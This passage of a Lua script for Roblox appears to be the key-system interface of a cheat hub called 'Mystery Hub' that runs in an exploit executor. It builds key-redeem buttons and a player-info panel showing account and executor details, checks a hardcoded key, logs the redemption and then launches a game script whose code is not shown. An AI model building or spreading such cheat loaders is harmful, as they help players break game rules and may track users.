	Parent = R.KeyInputHolder
})

R.ProgressRow = H.New("Frame", {
	Name = "ProgressRow",
	LayoutOrder = 6,
	BackgroundTransparency = 1,
	AutomaticSize = Enum.AutomaticSize.X,
	Size = UDim2.new(0, 0, 0, 8),
	Parent = R.KeyWidget
})

H.New("UIListLayout", {
	FillDirection = Enum.FillDirection.Horizontal,
	VerticalAlignment = Enum.VerticalAlignment.Center,
	Padding = UDim.new(0, 6),
	SortOrder = Enum.SortOrder.LayoutOrder,
	Parent = R.ProgressRow
})

for index = 1, 5 do
	local dot = H.New("Frame", {
		BackgroundColor3 = index == 2 and D.Accents[1].Accent2 or Palette.Border,
		Size = index == 2 and UDim2.new(0, 16, 0, 5) or UDim2.new(0, 5, 0, 5),
		LayoutOrder = index,
		Parent = R.ProgressRow
	})
	H.Corner(dot, 3)
end

R.ActionRow = H.New("Frame", {
	Name = "ActionRow",
	LayoutOrder = 7,
	BackgroundTransparency = 1,
	Size = UDim2.new(1, 0, 0, 42),
	Parent = R.KeyWidget
})

H.New("UIListLayout", {
	FillDirection = Enum.FillDirection.Horizontal,
	Padding = UDim.new(0, 10),
	SortOrder = Enum.SortOrder.LayoutOrder,
	Parent = R.ActionRow
})

local getKeyBtn = H.New("TextButton", {
	Text = "Get Key",
	Font = Enum.Font.GothamBold,
	TextSize = 13,
	TextColor3 = D.Accents[1].Accent2,
	BackgroundColor3 = Palette.PanelRaised,
	LayoutOrder = 1,
	Size = UDim2.new(0.5, -5, 1, 0),
	Parent = R.ActionRow
})
H.Corner(getKeyBtn, 12)
R.GetKeyStroke = H.Stroke(getKeyBtn, Palette.Border, 1)

local redeemBtn = H.New("TextButton", {
	Text = "Redeem Key",
	Font = Enum.Font.GothamBold,
	TextSize = 13,
	TextColor3 = Color3.fromRGB(255, 255, 255),
	BackgroundColor3 = D.Accents[1].Accent,
	LayoutOrder = 2,
	Size = UDim2.new(0.5, -5, 1, 0),
	Parent = R.ActionRow
})
H.Corner(redeemBtn, 12)
R.RedeemGradient = H.Gradient(redeemBtn, D.Accents[1].Accent2, D.Accents[1].Accent, 90)

R.MiniIconRow = H.New("Frame", {
	Name = "MiniIconRow",
	LayoutOrder = 8,
	BackgroundTransparency = 1,
	AutomaticSize = Enum.AutomaticSize.X,
	Size = UDim2.new(0, 0, 0, 38),
	Parent = R.KeyWidget
})

H.New("UIListLayout", {
	FillDirection = Enum.FillDirection.Horizontal,
	Padding = UDim.new(0, 10),
	SortOrder = Enum.SortOrder.LayoutOrder,
	Parent = R.MiniIconRow
})

local userBtn = H.New("TextButton", {
	Text = "\u{1F464}",
	Font = Enum.Font.GothamBold,
	TextSize = 15,
	TextColor3 = Palette.TextDim,
	BackgroundColor3 = Palette.PanelRaised,
	LayoutOrder = 1,
	Size = UDim2.new(0, 38, 0, 38),
	Parent = R.MiniIconRow
})
H.Corner(userBtn, 19)
H.Stroke(userBtn, Palette.BorderSoft, 1)
H.ApplyIcon(userBtn, "user", 18)

local chatBtn = H.New("TextButton", {
	Text = "\u{1F4AC}",
	Font = Enum.Font.GothamBold,
	TextSize = 15,
	TextColor3 = Palette.TextDim,
	BackgroundColor3 = Palette.PanelRaised,
	LayoutOrder = 2,
	Size = UDim2.new(0, 38, 0, 38),
	Parent = R.MiniIconRow
})
H.Corner(chatBtn, 19)
H.Stroke(chatBtn, Palette.BorderSoft, 1)
H.ApplyIcon(chatBtn, "message-circle", 18)

R.TaglineRow = H.New("Frame", {
	Name = "TaglineRow",
	BackgroundTransparency = 1,
	AutomaticSize = Enum.AutomaticSize.X,
	LayoutOrder = 9,
	Size = UDim2.new(0, 0, 0, 16),
	Parent = R.KeyWidget
})

H.New("UIListLayout", {
	FillDirection = Enum.FillDirection.Horizontal,
	VerticalAlignment = Enum.VerticalAlignment.Center,
	Padding = UDim.new(0, 5),
	SortOrder = Enum.SortOrder.LayoutOrder,
	Parent = R.TaglineRow
})

R.TaglineLabel = H.New("TextLabel", {
	Text = "unlock the mystery within",
	Font = Enum.Font.Gotham,
	TextSize = 11,
	TextColor3 = Palette.TextFaint,
	BackgroundTransparency = 1,
	AutomaticSize = Enum.AutomaticSize.X,
	LayoutOrder = 1,
	Size = UDim2.new(0, 0, 1, 0),
	Parent = R.TaglineRow
})

R.TaglineSparkle = H.New("TextLabel", {
	Name = "TaglineSparkle",
	Text = D.IconFallbacks.sparkles,
	Font = Enum.Font.Gotham,
	TextSize = 11,
	TextColor3 = Palette.TextFaint,
	BackgroundTransparency = 1,
	LayoutOrder = 2,
	Size = UDim2.new(0, 12, 0, 12),
	Parent = R.TaglineRow
})
H.ApplyIcon(R.TaglineSparkle, "sparkles", 12)

local userHeader, closeUserBtn = buildHeader(R.UserPanel, "Player Info", 1)

R.UserMiniHead = H.New("Frame", {
	Name = "UserMiniHead",
	LayoutOrder = 2,
	BackgroundTransparency = 1,
	Size = UDim2.new(1, 0, 0, 46),
	Parent = R.UserPanel
})
H.Padding(R.UserMiniHead, 0, 0, 16, 16)

R.UserAvatar = buildAvatarFrame(42, R.UserMiniHead)
R.UserAvatar.Position = UDim2.new(0, 0, 0, 2)

R.UserDisplayName = H.New("TextLabel", {
	Text = S.LocalPlayer.DisplayName,
	Font = Enum.Font.GothamBold,
	TextSize = 14,
	TextColor3 = Palette.Text,
	TextXAlignment = Enum.TextXAlignment.Left,
	TextTruncate = Enum.TextTruncate.AtEnd,
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 52, 0, 2),
	Size = UDim2.new(1, -52, 0, 18),
	Parent = R.UserMiniHead
})

R.UserUsername = H.New("TextLabel", {
	Text = "@" .. S.LocalPlayer.Name,
	Font = Enum.Font.Gotham,
	TextSize = 11,
	TextColor3 = Palette.TextFaint,
	TextXAlignment = Enum.TextXAlignment.Left,
	TextTruncate = Enum.TextTruncate.AtEnd,
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 52, 0, 20),
	Size = UDim2.new(1, -52, 0, 16),
	Parent = R.UserMiniHead
})

R.InfoList = H.New("Frame", {
	Name = "InfoList",
	LayoutOrder = 3,
	BackgroundTransparency = 1,
	Size = UDim2.new(1, 0, 0, 0),
	AutomaticSize = Enum.AutomaticSize.Y,
	Parent = R.UserPanel
})
H.Padding(R.InfoList, 0, 0, 16, 16)

H.New("UIListLayout", {
	Padding = UDim.new(0, 3),
	SortOrder = Enum.SortOrder.LayoutOrder,
	Parent = R.InfoList
})

local function addSectionTitle(order, text)
	H.New("TextLabel", {
		Text = text,
		Font = Enum.Font.GothamBold,
		TextSize = 10,
		TextColor3 = Palette.TextFaint,
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 0, 22),
		LayoutOrder = order,
		Parent = R.InfoList
	})
end

local function addInfoRow(order, label, value)
	local row = H.New("Frame", {
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 0, 24),
		LayoutOrder = order,
		Parent = R.InfoList
	})
	H.New("TextLabel", {
		Text = label,
		Font = Enum.Font.Gotham,
		TextSize = 12,
		TextColor3 = Palette.TextDim,
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		Size = UDim2.new(0.52, 0, 1, 0),
		Parent = row
	})
	local valueLabel = H.New("TextLabel", {
		Text = value,
		Font = Enum.Font.GothamMedium,
		TextSize = 12,
		TextColor3 = Palette.Text,
		TextXAlignment = Enum.TextXAlignment.Right,
		TextTruncate = Enum.TextTruncate.AtEnd,
		BackgroundTransparency = 1,
		Position = UDim2.new(0.52, 8, 0, 0),
		Size = UDim2.new(0.48, -8, 1, 0),
		Parent = row
	})
	return valueLabel
end

addSectionTitle(1, "Account")
addInfoRow(2, "User ID", tostring(S.LocalPlayer.UserId))
addInfoRow(3, "Account age", H.FormatAccountAge(S.LocalPlayer.AccountAge))

addSectionTitle(4, "Game")
addInfoRow(5, "Place ID", tostring(game.PlaceId))
addInfoRow(6, "Job ID", game.JobId ~= "" and game.JobId or "Studio")
addInfoRow(7, "Players", #S.Players:GetPlayers() .. " / " .. S.Players.MaxPlayers)

addSectionTitle(8, "Script")
addInfoRow(9, "Script", "Mystery Hub")
addInfoRow(10, "Version", V.ScriptVersion)
local execNameForPanel, execVersionForPanel = H.GetExecutorInfo()
addInfoRow(11, "Executor", execNameForPanel .. " " .. execVersionForPanel)

R.Toast = H.New("Frame", {
	Name = "Toast",
	AnchorPoint = Vector2.new(0.5, 1),
	Position = UDim2.new(0.5, 0, 1, -26),
	Size = UDim2.new(0, 280, 0, 44),
	BackgroundColor3 = Palette.PanelRaised,
	BackgroundTransparency = 1,
	Parent = R.ScreenGui
})
H.Corner(R.Toast, 12)
R.ToastStroke = H.Stroke(R.Toast, D.Accents[1].Accent, 1)
R.ToastStroke.Transparency = 1

R.ToastLabel = H.New("TextLabel", {
	Text = "",
	Font = Enum.Font.Gotham,
	TextSize = 12,
	TextColor3 = Palette.Text,
	TextTransparency = 1,
	TextWrapped = true,
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 12, 0, 0),
	Size = UDim2.new(1, -24, 1, 0),
	Parent = R.Toast
})

function H.ShowToast(message)
	St.ToastGen = (St.ToastGen or 0) + 1
	local myGen = St.ToastGen
	R.ToastLabel.Text = message
	H.Tween(R.Toast, {BackgroundTransparency = 0}, 0.18)
	H.Tween(R.ToastStroke, {Transparency = 0}, 0.18)
	H.Tween(R.ToastLabel, {TextTransparency = 0}, 0.18)
	task.delay(2.2, function()
		if St.ToastGen ~= myGen then
			return
		end
		H.Tween(R.Toast, {BackgroundTransparency = 1}, 0.25)
		H.Tween(R.ToastStroke, {Transparency = 1}, 0.25)
		H.Tween(R.ToastLabel, {TextTransparency = 1}, 0.25)
	end)
end

function H.ApplyAccent(index)
	V.AccentIndex = index
	local accent = D.Accents[index]
	for swatchIndex, entry in ipairs(R.Swatches) do
		entry.Ring.Transparency = swatchIndex == index and 0 or 1
	end
	R.StatusDot.BackgroundColor3 = accent.Accent2
	R.StatusLabel.TextColor3 = accent.Accent2
	R.KeyInputStroke.Color = accent.Accent
	R.GetKeyStroke.Color = accent.Accent
	getKeyBtn.TextColor3 = accent.Accent2
	R.RedeemGradient.Color = ColorSequence.new(accent.Accent2, accent.Accent)
	R.ToastStroke.Color = accent.Accent
	if not AvatarThumb then
		R.Avatar:FindFirstChildOfClass("UIGradient").Color = ColorSequence.new(accent.Accent2, accent.Accent)
		R.UserAvatar:FindFirstChildOfClass("UIGradient").Color = ColorSequence.new(accent.Accent2, accent.Accent)
	end
	for _, dot in ipairs(R.ProgressRow:GetChildren()) do
		if dot:IsA("Frame") and dot.Size.X.Offset == 16 then
			dot.BackgroundColor3 = accent.Accent2
		end
	end
end

function H.SetToggleState(toggle, knob, state, accentColor)
	if state then
		H.Tween(toggle, {BackgroundColor3 = accentColor}, 0.16)
		H.Tween(knob, {Position = UDim2.new(0, 20, 0, 2), BackgroundColor3 = Color3.fromRGB(255, 255, 255)}, 0.16)
	else
		H.Tween(toggle, {BackgroundColor3 = Palette.BorderSoft}, 0.16)
		H.Tween(knob, {Position = UDim2.new(0, 2, 0, 2), BackgroundColor3 = Color3.fromRGB(203, 185, 230)}, 0.16)
	end
end

local function togglePanel(panel)
	panel.Visible = not panel.Visible
end

settingsBtn.MouseButton1Click:Connect(function()
	togglePanel(R.SettingsPanel)
end)

closeSettingsBtn.MouseButton1Click:Connect(function()
	R.SettingsPanel.Visible = false
end)

userBtn.MouseButton1Click:Connect(function()
	togglePanel(R.UserPanel)
end)

closeUserBtn.MouseButton1Click:Connect(function()
	R.UserPanel.Visible = false
end)

mainCloseBtn.MouseButton1Click:Connect(function()
	H.Tween(R.KeyWidget, {BackgroundTransparency = 1}, 0.2)
	task.delay(0.22, function()
		R.ScreenGui:Destroy()
	end)
end)

for index, entry in ipairs(R.Swatches) do
	entry.Button.MouseButton1Click:Connect(function()
		H.ApplyAccent(index)
	end)
end

function H.SpawnParticleLoop()
	St.ParticleGen = St.ParticleGen + 1
	local myGen = St.ParticleGen
	task.spawn(function()
		while V.ParticlesEnabled and St.ParticleGen == myGen do
			if not V.ReducedMotion then
				local particle = H.New("Frame", {
					BackgroundColor3 = D.Accents[V.AccentIndex].Accent2,
					Position = UDim2.new(math.random(), 0, 1, 0),
					Size = UDim2.new(0, 4, 0, 4),
					BackgroundTransparency = 0.3,
					Parent = R.ParticleLayer
				})
				H.Corner(particle, 2)
				local drift = math.random(-40, 40)
				H.Tween(particle, {
					Position = UDim2.new(particle.Position.X.Scale, drift, -0.3, 0),
					BackgroundTransparency = 1
				}, math.random(5, 9), Enum.EasingStyle.Linear)
				task.delay(9, function()
					particle:Destroy()
				end)
			end
			task.wait(0.4)
		end
	end)
end

blurToggle.MouseButton1Click:Connect(function()
	V.BlurEnabled = not V.BlurEnabled
	H.SetToggleState(blurToggle, blurKnob, V.BlurEnabled, D.Accents[V.AccentIndex].Accent)
	if V.BlurEnabled then
		if not St.BlurEffect then
			St.BlurEffect = H.New("BlurEffect", {Size = 12, Parent = S.Lighting})
		end
	else
		if St.BlurEffect then
			St.BlurEffect:Destroy()
			St.BlurEffect = nil
		end
	end
end)

particlesToggle.MouseButton1Click:Connect(function()
	V.ParticlesEnabled = not V.ParticlesEnabled
	H.SetToggleState(particlesToggle, particlesKnob, V.ParticlesEnabled, D.Accents[V.AccentIndex].Accent)
	if V.ParticlesEnabled then
		H.SpawnParticleLoop()
	else
		St.ParticleGen = St.ParticleGen + 1
	end
end)

compactToggle.MouseButton1Click:Connect(function()
	V.CompactMode = not V.CompactMode
	H.SetToggleState(compactToggle, compactKnob, V.CompactMode, D.Accents[V.AccentIndex].Accent)
	if V.CompactMode then
		R.BodyList.Padding = UDim.new(0, 8)
		R.BodyPadding.PaddingTop = UDim.new(0, 10)
		R.BodyPadding.PaddingBottom = UDim.new(0, 14)
	else
		R.BodyList.Padding = UDim.new(0, 14)
		R.BodyPadding.PaddingTop = UDim.new(0, 16)
		R.BodyPadding.PaddingBottom = UDim.new(0, 20)
	end
end)

motionToggle.MouseButton1Click:Connect(function()
	V.ReducedMotion = not V.ReducedMotion
	H.SetToggleState(motionToggle, motionKnob, V.ReducedMotion, D.Accents[V.AccentIndex].Accent)
end)

getKeyBtn.MouseButton1Click:Connect(function()
	local copied = H.SetClipboard(D.DiscordInvite)
	if copied then
		H.ShowToast("Discord invite copied - join to get your key")
	else
		H.ShowToast("Copy failed - invite link: " .. D.DiscordInvite)
	end
end)

local function attemptRedeem()
	local now = tick()
	if St.LastInvalidAt and (now - St.LastInvalidAt) < 1 then
		return
	end
	local raw = R.KeyInput.Text
	local trimmed = raw:gsub("^%s+", ""):gsub("%s+$", "")
	if trimmed == "" then
		H.ShowToast("Enter a key first")
		return
	end
	if string.upper(trimmed) ~= D.ValidKey then
		St.LastInvalidAt = now
		H.ShowToast("Invalid key")
		return
	end
	getgenv()._MYSTERYHUB_KEY_OK = true
	H.ShowToast("Key accepted - loading...")
	H.SendLog("Key Redeemed")
	local success = H.RunGameScript(function(message)
		H.ShowToast(message)
	end)
	if success then
		H.Tween(R.KeyWidget, {BackgroundTransparency = 1}, 0.25)
		task.delay(0.3, function()
			R.ScreenGui:Destroy()
		end)
	end
end

redeemBtn.MouseButton1Click:Connect(attemptRedeem)

R.KeyInput.FocusLost:Connect(function(enterPressed)
	if enterPressed then
		attemptRedeem()
	end
end)

chatBtn.MouseButton1Click:Connect(function()
	H.ShowToast("Support chat coming soon")
end)

function H.UpdateResponsive()
	local viewport = S.Camera and S.Camera.ViewportSize or Vector2.new(1280, 720)
	local scale = viewport.X / 900
	scale = math.clamp(scale, 0.45, 1)
	R.LayoutScale.Scale = scale
end

local function bindCamera(camera)
	if not camera then
		return
	end
	camera:GetPropertyChangedSignal("ViewportSize"):Connect(H.UpdateResponsive)
end

bindCamera(S.Camera)

workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
	S.Camera = workspace.CurrentCamera
	bindCamera(S.Camera)
	H.UpdateResponsive()
end)

H.SetToggleState(particlesToggle, particlesKnob, true, D.Accents[V.AccentIndex].Accent)
H.SpawnParticleLoop()
H.UpdateResponsive()
